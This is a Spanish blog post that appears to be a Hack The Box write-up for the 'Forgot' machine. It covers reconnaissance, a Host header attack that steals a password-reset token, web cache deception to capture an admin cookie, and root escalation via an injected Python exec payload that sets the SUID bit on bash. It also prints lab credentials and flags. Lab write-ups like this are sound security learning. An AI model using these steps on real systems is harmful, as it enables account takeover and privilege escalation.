<!DOCTYPE html><html lang="es-ES" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.3.1" /><meta property="og:title" content="Forgot Writeup" /><meta name="author" content="Miguel3023" /><meta property="og:locale" content="es_ES" /><meta name="description" content="En esta máquina veremos un “Host Header attack” para pasar un panel de login. Luego un “web cache deception” para obtener acceso como usuario no privilegiado en la web. Por último abusamos del privilegio sudoers para obtener root." /><meta property="og:description" content="En esta máquina veremos un “Host Header attack” para pasar un panel de login. Luego un “web cache deception” para obtener acceso como usuario no privilegiado en la web. Por último abusamos del privilegio sudoers para obtener root." /><link rel="canonical" href="/posts/writeup-forgot/" /><meta property="og:url" content="/posts/writeup-forgot/" /><meta property="og:site_name" content="Miguel3023" /><meta property="og:image" content="/assets/img/commons/Forgot/Forgot.png" /><meta property="og:image:height" content="450" /><meta property="og:image:width" content="800" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-11-19T00:00:00-05:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="/assets/img/commons/Forgot/Forgot.png" /><meta property="twitter:title" content="Forgot Writeup" /><meta name="twitter:site" content="@AngelMiguel3023" /><meta name="twitter:creator" content="@AngelMiguel3023" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Miguel3023","url":"https://miguel3023.github.io"},"dateModified":"2022-12-26T18:41:05-05:00","datePublished":"2022-11-19T00:00:00-05:00","description":"En esta máquina veremos un “Host Header attack” para pasar un panel de login. Luego un “web cache deception” para obtener acceso como usuario no privilegiado en la web. Por último abusamos del privilegio sudoers para obtener root.","headline":"Forgot Writeup","image":{"width":800,"height":450,"url":"/assets/img/commons/Forgot/Forgot.png","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"/posts/writeup-forgot/"},"url":"/posts/writeup-forgot/"}</script><title>Forgot Writeup | Miguel3023</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Miguel3023"><meta name="application-name" content="Miguel3023"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/commons/sr.integra.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title"> <a href="/">Miguel3023</a></div><div class="site-subtitle font-italic">CTF Player | Cybersecurity enthusiast</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>INICIO</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORÍAS</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>ETIQUETAS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVO</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ACERCA DE MÍ</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/miguel3023" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/AngelMiguel3023" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="https://app.hackthebox.com/profile/907376" aria-label="hackthebox" target="_blank" rel="noopener"> <i class="fas fa-cube"></i> </a> <a href="https://www.linkedin.com/in/miguel-malag%C3%B3n-8547301b0/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Inicio </a> </span> <span>Forgot Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Entrada</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Buscar..."> </span> <span id="search-cancel" >Cancelar</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Forgot Writeup</h1><div class="post-meta text-muted"> <span> Publicado <em class="" data-ts="1668834000" data-df="DD/MM/YYYY" data-toggle="tooltip" data-placement="bottom"> 19/11/2022 </em> </span> <span> Actualizado <em class="" data-ts="1672098065" data-df="DD/MM/YYYY" data-toggle="tooltip" data-placement="bottom"> 26/12/2022 </em> </span><div class="mt-3 mb-3"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 800 450'%3E%3C/svg%3E" data-src="../../assets/img/commons/Forgot/Forgot.png" class="preview-img bg" alt="Preview Image" width="800" height="450" data-proofer-ignore></div><div class="d-flex justify-content-between"> <span> Por <em> <a href="https://miguel3023.github.io">Miguel3023</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1208 palabras"> <em>6 min</em> de lectura</span></div></div></div><div class="post-content"><p>En esta máquina veremos un “Host Header attack” para pasar un panel de login. Luego un “web cache deception” para obtener acceso como usuario no privilegiado en la web. Por último abusamos del privilegio sudoers para obtener root.</p><h2 id="reconocimiento"><span class="mr-2">Reconocimiento</span><a href="#reconocimiento" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Primeramente realizamos un escaneo con nmap para detectar los puertos abiertos</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>❯ nmap -p- -sS --min-rate 5000 --open -v -n -Pn 10.10.11.188 -oG OpenPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-20 00:34 -05
Initiating SYN Stealth Scan at 00:34
Scanning 10.10.11.188 [65535 ports]
Discovered open port 80/tcp on 10.10.11.188
Discovered open port 22/tcp on 10.10.11.188
Completed SYN Stealth Scan at 00:34, 13.78s elapsed (65535 total ports)
Nmap scan report for 10.10.11.188
Host is up (0.22s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
</pre></table></code></div></div><p>Con <strong>whatweb</strong> podemos ver qué tecnologías emplea la web que hay en el puerto 80</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>❯ whatweb http://10.10.11.188
http://10.10.11.188 [503 Service Unavailable] Country[RESERVED][ZZ], HTML5, HTTPServer[Varnish], IP[10.10.11.188], Title[503 Backend fetch failed], UncommonHeaders[retry-after,x-varnish], Varnish, Via-Proxy[1.1 varnish (Varnish/6.2)]

</pre></table></code></div></div><p>Luego con nmap detectamos la versión y los servicios que están en los puertos que encontramos previamente abiertos</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>❯ nmap -sC -sV -p22,80 10.10.11.188 -oN Versions
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-20 00:55 -05
Nmap scan report for 10.10.11.188
Host is up (0.11s latency).

PORT   STATE SERVICE    VERSION
22/tcp open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http-proxy Varnish http accelerator
|_http-title: 503 Backend fetch failed
|_http-server-header: Varnish
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</pre></table></code></div></div><p>Ahora fuzzeamos por directorios a ver qué encontramos.</p><p><code class="language-plaintext highlighter-rouge">Nota:</code> Nos tiene que aparecer un panel de login en la propia web, si no te aparece reinicia la máquina (me sucedió por eso lo menciono)</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre>❯ wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.11.188/FUZZ

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                       
=====================================================================

000000001:   200        245 L    484 W      5186 Ch     "# directory-list-2.3-medium.txt"                                             
000000007:   200        245 L    484 W      5186 Ch     "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"             
000000008:   200        245 L    484 W      5186 Ch     "# or send a letter to Creative Commons, 171 Second Street,"                  
000000003:   200        245 L    484 W      5186 Ch     "# Copyright 2007 James Fisher"                                               
000000010:   200        245 L    484 W      5186 Ch     "#"                                                                           
000000005:   200        245 L    484 W      5186 Ch     "# This work is licensed under the Creative Commons"                          
000000014:   200        245 L    484 W      5186 Ch     "http://10.10.11.188/"                                                        
000000006:   200        245 L    484 W      5186 Ch     "# Attribution-Share Alike 3.0 License. To view a copy of this"               
000000002:   200        245 L    484 W      5186 Ch     "#"                                                                           
000000004:   200        245 L    484 W      5186 Ch     "#"                                                                           
000000013:   200        245 L    484 W      5186 Ch     "#"                                                                           
000000009:   200        245 L    484 W      5186 Ch     "# Suite 300, San Francisco, California, 94105, USA."                         
000000012:   200        245 L    484 W      5186 Ch     "# on atleast 2 different hosts"                                              
000000011:   200        245 L    484 W      5186 Ch     "# Priority ordered case sensative list, where entries were found"            
000000038:   302        5 L      22 W       189 Ch      "home"                                                                        
000000053:   200        245 L    484 W      5189 Ch     "login"                                                                       
000001706:   200        252 L    498 W      5227 Ch     "forgot"                                                                      
000002357:   302        5 L      22 W       189 Ch      "tickets"                    

</pre></table></code></div></div><h2 id="intrusión"><span class="mr-2">Intrusión</span><a href="#intrusión" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>En en código fuente podemos ver un usuario potencial</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="c">&lt;!-- Q1 release fix by robert-dev-145092 --&gt;</span>
</pre></table></code></div></div><p>Nos montamos un servidor con python por el puerto 80</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
</pre></table></code></div></div><p>Ahora en la ruta <strong>/forgot</strong> que encontramos anteriormente colocamos el usuario que vimos. Realizamos la petición y capturamos la petición con Burpsuite y cambiamos el HOST por nuestra ip y el puerto donde tenemos el servidor</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>GET /forgot?username=robert-dev-145092 HTTP/1.1
Host: 10.10.16.47:80
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0
Accept: */*
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Referer: http://10.10.11.188/forgot
</pre></table></code></div></div><p>Ahora interceptamos la petición de <strong>/reset</strong> colocando el token que nos dio de manera urlencodeada para luego iniciar sesión como <strong>robert-dev-145092</strong>. (Si no te funciona el token a la primera, intenta nuevamente con otro token que te da si te quedaste en escucha con python)</p><p><img data-src="/assets/img/commons/Forgot/Burp.png" alt="Burpsuite" class="center-image" data-proofer-ignore> <em>Petición por Burp</em></p><p>Una vez obtenido el acceso a la web, vemos que en el apartado <strong>/escalate</strong> podemos enviarle un link para que el admin haga click en él.También si vemos el código fuente en el apartado de escalate podemos ver una ruta <strong>/admin_tickets</strong> si intentamos ingresar vemos que nos dice acceso denegado. Para obtener acceso a esa ruta lo que podemos hacer es lo siguiente:</p><p><img data-src="/assets/img/commons/Forgot/inexistent.png" alt="Burpsuite" class="center-image" data-proofer-ignore> <em>Petición por Burp</em></p><p>Una vez hemos hecho esto, colocamos en la url lo mismo que le mandamos al admin sólo que hasta <strong>/js</strong> porque o sino Burpsuite no nos intercepta la petición, la mandamos al repeater y allí le colocamos <strong>/test.js</strong></p><p><img data-src="/assets/img/commons/Forgot/cambiamos.png" alt="Burpsuite" class="center-image" data-proofer-ignore> <em>Petición por Burp</em></p><p>Veremos que nos dice “404 not found”, esto es porque ahora simplemente lo hay que hacer es enviarle otra vez a admin el link, pero esta vez, ponle otra <strong>s</strong> al final del “/test/js”, quedaría tal que así “/test.jss” y esperas un poco a que admin le dé click a ese link. Una vez hecho esto, simplemente en la petición anterior, le agregas una <strong>s</strong></p><p><img data-src="/assets/img/commons/Forgot/cookie.png" alt="Burpsuite" class="center-image" data-proofer-ignore> <em>Petición por Burp</em></p><p>Listo, ya hemos hecho un “cache deception attack” y capturado la cookie de admin en el lado de la respuesta, ahora sólo resta acceder a “/admin_tickets”. Simplemente intercepta con Burpsuite y cambias la cookie de session de tu usuario actual por la de admin. y veremos las credenciales del usuario por ssh</p><p><img data-src="/assets/img/commons/Forgot/credenciales.png" alt="Burpsuite" class="center-image" data-proofer-ignore> <em>Credenciales</em></p><h2 id="privesc"><span class="mr-2">Privesc</span><a href="#privesc" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Nos conectamos por ssh</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>-bash-5.0$ whoami
diego
-bash-5.0$ cat user.txt 
4929615d53c0dcd5c4e69e18d1665e38
-bash-5.0$
</pre></table></code></div></div><p>Podemos ver un script “bot.py” y que se conecta a la base de datos</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="o">-</span><span class="n">bash</span><span class="o">-</span><span class="mf">5.0</span><span class="err">$</span> <span class="n">cat</span> <span class="n">bot</span><span class="p">.</span><span class="n">py</span> 
   <span class="c1"># Fetch Links
</span>  <span class="n">conn</span> <span class="o">=</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connector</span><span class="p">.</span><span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s">"localhost"</span><span class="p">,</span><span class="n">database</span><span class="o">=</span><span class="s">"app"</span><span class="p">,</span><span class="n">user</span><span class="o">=</span><span class="s">"diego"</span><span class="p">,</span><span class="n">password</span><span class="o">=</span><span class="s">"dCb#1!x0%gjq"</span><span class="p">)</span>
  <span class="n">cursor</span> <span class="o">=</span> <span class="n">conn</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span>
  <span class="n">cursor</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">'select * from forgot'</span><span class="p">)</span>
  <span class="n">r</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="n">fetchall</span><span class="p">()</span> 
</pre></table></code></div></div><p>Si hacemos sudo -l podemos ver que tenemos un script que podemos ejecutar de manera privilegiada, si lo vemos nos muestra lo siguiente:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre> <span class="c1"># Grab links
</span> <span class="n">conn</span> <span class="o">=</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connector</span><span class="p">.</span><span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s">'localhost'</span><span class="p">,</span><span class="n">database</span><span class="o">=</span><span class="s">'app'</span><span class="p">,</span><span class="n">user</span><span class="o">=</span><span class="s">'diego'</span><span class="p">,</span><span class="n">password</span><span class="o">=</span><span class="s">'dCb#1!x0%gjq'</span><span class="p">)</span>
 <span class="n">cursor</span> <span class="o">=</span> <span class="n">conn</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span>
 <span class="n">cursor</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">'select reason from escalate'</span><span class="p">)</span>
 <span class="n">r</span> <span class="o">=</span> <span class="p">[</span><span class="n">i</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">cursor</span><span class="p">.</span><span class="n">fetchall</span><span class="p">()]</span>
 <span class="n">conn</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
 <span class="n">data</span><span class="o">=</span><span class="p">[]</span>
 <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">r</span><span class="p">:</span>
         <span class="n">data</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
 <span class="n">Xnew</span> <span class="o">=</span> <span class="n">getVec</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</pre></table></code></div></div><p>También podemos una librería <strong>tensorflow</strong> y si buscamos encontramos cómo vulnerarlo para <a href="https://github.com/advisories/GHSA-75c9-jrh4-79mc">este</a></p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">assessData</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
    <span class="n">score</span> <span class="o">=</span> <span class="p">((.</span><span class="mi">175</span><span class="o">*</span><span class="n">ynew1</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="o">+</span><span class="p">(.</span><span class="mi">15</span><span class="o">*</span><span class="n">ynew2</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="o">+</span><span class="p">(.</span><span class="mi">05</span><span class="o">*</span><span class="n">ynew3</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="o">+</span><span class="p">(.</span><span class="mi">075</span><span class="o">*</span><span class="n">ynew4</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="o">+</span><span class="p">(.</span><span class="mi">25</span><span class="o">*</span><span class="n">ynew5</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="o">+</span><span class="p">(.</span><span class="mi">3</span><span class="o">*</span><span class="n">ynew6</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span>
    <span class="k">if</span> <span class="n">score</span> <span class="o">&gt;=</span> <span class="p">.</span><span class="mi">5</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
                <span class="n">preprocess_input_exprs_arg_string</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">],</span><span class="n">safe</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
        <span class="k">except</span><span class="p">:</span>
                <span class="k">pass</span>
</pre></table></code></div></div><p>Lo que hace es verificar patrones maliciosos en la base de datos. Si saturamos esto, podemos inyectar código para que se ejecute. Nos conectamos a la base de datos y ejecutamos lo siguiente:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>mysql&gt; insert into escalate values ("1","1","1",'test=exec("""\nimport os\nos.system("chmod +s /usr/bin/bash")""")');

</pre></table></code></div></div><p>Ahora hacemos <strong>bash -p y obtenemos root</strong></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>-bash-5.0$ bash -p
bash-5.0# cat /root/root.txt 
d41b9cbb909802752553be9dd7c82720
bash-5.0#
</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/writeup/'>Writeup</a>, <a href='/categories/htb/'>HTB</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/linux/" class="post-tag no-text-decoration" >Linux</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >CTF</a> <a href="/tags/medium/" class="post-tag no-text-decoration" >Medium</a> <a href="/tags/cache-deception/" class="post-tag no-text-decoration" >Cache Deception</a> <a href="/tags/sudoers/" class="post-tag no-text-decoration" >Sudoers</a> <a href="/tags/host-header-attack/" class="post-tag no-text-decoration" >Host Header Attack</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> Esta entrada está licenciada bajo <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> por el autor.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Compartir</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Forgot+Writeup+-+Miguel3023&url=%2Fposts%2Fwriteup-forgot%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Forgot+Writeup+-+Miguel3023&u=%2Fposts%2Fwriteup-forgot%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=%2Fposts%2Fwriteup-forgot%2F&text=Forgot+Writeup+-+Miguel3023" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copiar enlace" data-title-succeed="¡Enlace copiado!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Actualizado recientemente</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Writeup-Surveillance/">Surveillance Writeup</a><li><a href="/posts/writeup-broscience/">BroScience Writeup</a><li><a href="/posts/crackeo-contrase%C3%B1as/">Crackeo Contraseñas</a><li><a href="/posts/rbcd-attack/">Resource-Based Constrained Delegation Attack</a><li><a href="/posts/NoSQLI/">NoSQLI</a></ul></div><div id="access-tags"><div 